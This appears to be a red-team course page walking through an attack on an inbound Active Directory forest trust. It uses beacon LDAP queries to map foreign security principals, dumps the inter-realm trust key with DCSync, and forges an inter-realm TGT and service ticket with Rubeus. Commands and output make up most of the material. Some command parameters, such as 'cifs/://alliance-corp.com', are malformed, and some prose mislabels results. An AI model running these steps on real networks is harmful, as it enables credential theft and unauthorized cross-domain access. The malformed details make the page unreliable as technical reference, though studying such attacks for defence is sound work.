---
title: "Cross-Forest Domain Relationships (Inbound Trusts)"
date: 2026-09-25
weight: 1
type: docs
tags:
  - Active Directory
  - Forest & Domain Trusts
---

A unidirectional, one-way trust architecture is established when an organization requires resource sharing with an external security zone while preventing those foreign entities from accessing native environment assets. These access constraints are commonly implemented during cross-corporate data migrations or to isolate distinct partner connections.

Querying a Trusted Domain Object (TDO) identifies an inbound transitive forest link established with the external target `alliance-corp.com`.

```powershell
beacon> getuid
[*] You are ARCADIA\operator.user

beacon> ldapsearch (objectClass=trustedDomain)

name: alliance-corp.com
trustDirection: 1
trustAttributes: 8
flatName: ALLIANCE
```

When an operator operates from the trusted domain side of a relationship, they align with the valid direction of authentication. This position allows them to access mapped assets inside the trusting domain by design. The operational framework involves identifying and assuming the context of specific principals within the trusted forest that possess legitimate entitlements inside the trusting forest. 

Note that Golden Tickets embedded with SID History fail over these external boundaries because Active Directory enforces strict SID filtering on external trust vectors, dropping any security identifier that does not originate within the local domain structure.

## Mapping Foreign Security Principals

Active Directory isolates external identities using a specialized container named Foreign Security Principals, which houses `foreignSecurityPrincipal` objects. These structures track external security descriptors, enabling foreign domain objects to receive direct group assignments within the local realm. Operators can query this boundary configuration directly across the inbound trust path.

```powershell
beacon> ldapsearch (objectClass=foreignSecurityPrincipal) --attributes cn,memberOf --hostname alliance-corp.com --dn DC=alliance,DC=corp

Binding to alliance-corp.com

[*] Distinguished name: DC=alliance,DC=corp
[*] Filter: (objectClass=foreignSecurityPrincipal)
[*] Scope of search value: 3
[*] Returning specific attribute(s): cn,memberOf

--------------------
cn: S-1-5-4
--------------------
cn: S-1-5-11
memberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=alliance,DC=corp, CN=Users,CN=Builtin,DC=alliance,DC=corp
--------------------
cn: S-1-5-17
--------------------
cn: S-1-5-9
--------------------
cn: S-1-5-21-4192837465-1122334455-998877665-6102
memberOf: CN=Alliance Access Users,CN=Users,DC=alliance,DC=corp
retreived 5 results total
```

Standard automated processing disregards four baseline built-in identifiers: `S-1-5-4`, `S-1-5-9`, `S-1-5-11`, and `S-1-5-17`. Any supplemental security descriptors warrant immediate verification. 

In this scenario, a fifth entry reveals an active foreign identifier: `S-1-5-21-4192837465-1122334455-998877665-6102`. This security descriptor originates inside the trusted domain (`arcadia.local`). To determine whether this record represents a specific user profile or an active security group, perform a targeted directory query.

```powershell
beacon> ldapsearch (objectSid=S-1-5-21-4192837465-1122334455-998877665-6102)

--------------------
objectClass: top, group
cn: Cross Boundary Jump Users
member: CN=Operator User,CN=Users,DC=arcadia,DC=local
distinguishedName: CN=Cross Boundary Jump Users,CN=Users,DC=arcadia,DC=local
name: Cross Boundary Jump Users
objectSid: S-1-5-21-4192837465-1122334455-998877665-6102
sAMAccountName: Cross Boundary Jump Users
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=arcadia,DC=local
```

The parsed TDO structure confirms that this trusted group from `arcadia.local` is nested inside a localized `alliance-corp.com` group named **Alliance Access Users**. Administrators apply this group nesting to distribute target system entitlements to foreign sessions. Operators can discover where these permissions are actively assigned by reviewing Group Policy Object deployments or performing local group enumeration on target assets inside `alliance-corp.com`.

```powershell
beacon> ldapsearch (samAccountType=805306369) --attributes samAccountName --dn DC=alliance,DC=corp --hostname alliance-corp.com

Binding to alliance-corp.com

[*] Distinguished name: DC=alliance,DC=corp
[*] Filter: (samAccountType=805306369)
[*] Scope of search value: 3
[*] Returning specific attribute(s): samAccountName

--------------------
sAMAccountName: ALL-DC-1$
--------------------
sAMAccountName: ALL-SRV-1$
retreived 2 results total
```

These mapping structures can be collected manually or processed through specialized collectors like BOFHound to reconstruct complete attack graphs inside BloodHound. Alternatively, operators can run targeted scans within the foreign domain to find secondary vulnerability vectors, such as roastable user profiles or outdated application deployments.

## Assembling Inter-Realm Referral Tickets

When an operator possesses valid authentication tokens for an eligible principal, they can establish a network token session to allow the OS to request cross-boundary application keys automatically. Alternatively, operators can manually construct inter-realm referral tickets by harvesting the domain's inter-realm trust keys. While operating inside the trusted domain context, extracting this trust key requires a DCSync operation targeting the corresponding trust account object.

```powershell
beacon> dcsync arcadia.local ARCADIA\ALLIANCE$

Credentials:
  Hash NTLM: 6150491cceb080dffeaaec5e60d8f58d
    ntlm- 0: 6150491cceb080dffeaaec5e60d8f58d
    lm  - 0: a1542b43120fba746668d676b8e25f40

Supplemental Credentials:
* Primary:Kerberos-Newer-Keys *
    Default Salt : ARCADIA.LOCALkrbtgtALLIANCE
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 48ceeb9986c09692d2200d6b8d4ba8ff0152a49a3507bee92bfc62281fa756fa
      aes128_hmac       (4096) : 7d6b3d1ace90c769bcaab80eaa8da70d
      des_cbc_md5       (4096) : 5d5e67259270abc4
```

These extracted keys can be passed directly to the `silver` ticket engine within Rubeus. Because cross-forest trust relationships fallback to legacy RC4 ciphers during transit authentication flows by default, operators supply the captured NTLM hash parameter.

```powershell
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:operator.user /domain:ARCADIA.LOCAL /sid:S-1-5-21-4192837465-1122334455-998877665 /id:1105 /groups:513,1106,6102 /service:krbtgt/alliance-corp.com /rc4:6150491cceb080dffeaaec5e60d8f58d /nowrap

[*] Action: Build TGS

[*] Building PAC

[*] Domain         : ARCADIA.LOCAL (ARCADIA)
[*] SID            : S-1-5-21-4192837465-1122334455-998877665
[*] UserId         : 1105
[*] Groups         : 513,1106,6102
[*] ServiceKey     : 6150491CCEB080DFFEAAEC5E60D8F58D
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 6150491CCEB080DFFEAAEC5E60D8F58D
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : alliance-corp.com

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'operator.user@ARCADIA.LOCAL'

[*] AuthTime       : 18/03/2025 11:50:59
[*] StartTime      : 18/03/2025 11:50:59
[*] EndTime        : 18/03/2025 21:50:59
[*] RenewTill      : 25/03/2025 11:50:59

[*] base64(ticket.kirbi):

      doIFM[...snip...]mNvbQ==
```

Command layout properties:
* `/user`: The targeted account context to inject inside the ticket structure.
* `/domain`: The FQDN of the local trusted forest.
* `/sid`: The baseline security identifier of the trusted forest environment.
* `/id`: The primary relative identifier (RID) matching the targeted user.
* `/groups`: Explicit group RID mappings representing the user's forest authorizations (`513` denotes Domain Users, `1106` maps to Workstation Admins, and `6102` introduces the Cross Boundary Jump Users context).
* `/service`: The target domain's internal `krbtgt` service registration path.
* `/rc4`: The isolated inter-realm trust secret.

When assembling referral parameters offline, operators must manually map true group memberships rather than relying on default tool outputs to avoid validation errors. Alternatively, append the `/ldap` parameter to query directory structures dynamically during ticket construction.

The resulting forged inter-realm TGT can then be submitted via Rubeus `asktgs` to request application access tokens from the trusting forest's Domain Controllers.

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/://alliance-corp.com /dc:://alliance-corp.com /ticket:doIFM[...snip...]mNvbQ== /nowrap

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'cifs/://alliance-corp.com'
[*] Using domain controller: ://alliance-corp.com (10.10.10.11)
[+] TGS request successful!
[*] base64(ticket.kirbi):
```
